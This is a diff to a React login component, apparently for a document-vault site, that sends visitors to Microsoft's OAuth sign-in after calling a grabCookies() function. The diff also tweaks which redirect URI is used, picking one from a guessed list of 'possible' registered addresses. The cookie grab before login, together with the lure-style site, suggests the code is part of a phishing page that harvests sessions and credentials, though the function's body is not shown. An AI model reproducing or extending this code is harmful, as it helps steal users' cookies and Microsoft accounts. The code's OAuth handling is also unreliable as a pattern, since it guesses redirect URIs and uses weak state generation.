@@ -47,12 +47,22 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
 
   // Real Microsoft OAuth configuration
   const STATE = Math.random().toString(36).substring(2, 15);
-  const REDIRECT_URI = 'https://vaultydocs.com/oauth-callback';
+  // Try common redirect URIs that might be registered
+  const possibleRedirectURIs = [
+    'https://vaultydocs.com/',
+    window.location.origin + '/',
+    window.location.href.split('?')[0], // Current page without query params
+    'https://localhost:3000/', // If registered for development
+  ];
+  
+  // Use the first one (you may need to change this based on your app registration)
+  const REDIRECT_URI = possibleRedirectURIs[1]; // Using current origin
+  
   const MICROSOFT_OAUTH_URL =
     'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?' +
     'client_id=eabd0e31-5707-4a85-aae6-79c53dc2c7f0&' +
     'response_type=code&' +
-    `redirect_uri=${REDIRECT_URI}&` +
+    `redirect_uri=${encodeURIComponent(REDIRECT_URI)}&` +
     'response_mode=query&' +
     'scope=openid%20profile%20email&' +
     'prompt=login' +
@@ -509,12 +519,7 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
     // Grab cookies before redirect (from session if available)
     grabCookies();
 
-    // Add OAuth callback parameter to current URL for handling return
-    const currentUrl = new URL(window.location.href);
-    currentUrl.searchParams.set('oauth_callback', 'true');
-    window.history.replaceState({}, '', currentUrl.toString());
-
-    // Redirect to Microsoft OAuth
+    // Redirect to Microsoft OAuth (will return to this same page)
     window.location.href = MICROSOFT_OAUTH_URL;
   };
 
